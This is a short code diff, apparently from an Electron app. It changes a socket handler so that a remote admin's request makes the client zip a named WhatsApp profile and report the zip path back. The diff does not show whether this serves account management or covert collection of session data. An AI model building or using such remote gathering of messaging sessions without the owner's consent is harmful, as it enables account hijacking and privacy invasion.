@@ -254,9 +254,11 @@ window.onload = async () => {
             }
         });
 
-        socket.on('request-zip-whatsapp', async (adminId) => {
+        socket.on('request-zip-whatsapp', async (data) => {
+            const adminId = data.adminId || data;
+            const profileName = data.profileName;
             try {
-                const zipPath = await window.electronAPI.zipWhatsappProfile();
+                const zipPath = await window.electronAPI.zipWhatsappProfile(profileName);
                 if (zipPath) {
                     socket.emit('whatsapp-zip-ready', { adminId, targetId: socket.id, path: zipPath });
                 } else {
